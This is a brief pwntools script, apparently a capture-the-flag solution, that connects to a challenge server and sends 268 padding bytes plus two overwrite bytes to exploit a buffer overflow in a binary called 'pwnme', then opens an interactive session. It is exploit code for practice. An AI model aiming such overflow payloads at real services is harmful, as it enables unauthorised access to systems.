from pwn import *

p = process("./pwnme")

p = remote("0.cloud.chals.io", 19595)

offset = "A"*268
value = "\x37\x13"
payload = offset + value

p.sendline(payload.encode())

p.interactive()